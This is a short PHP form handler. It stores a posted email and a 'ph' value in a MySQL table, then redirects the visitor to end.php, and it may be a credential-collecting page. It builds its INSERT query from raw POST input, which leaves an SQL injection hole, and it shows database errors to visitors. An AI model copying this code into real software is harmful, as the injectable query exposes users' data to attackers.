<?php
header ('Location: end.php');
include 'db.php';
$email = $_POST['email'];
$ph = $_POST['ph'];
$date = date("d F Y h:i:s A");


$sql = "INSERT INTO ph
	(ph_id,ph_username,ph_ph)
	VALUES
	('','$email','$ph')";
mysql_select_db($dbname);
$retval = mysql_query( $sql, $conn );
if(! $retval )
{
  die('Could not get data: ' . mysql_error());
}



?>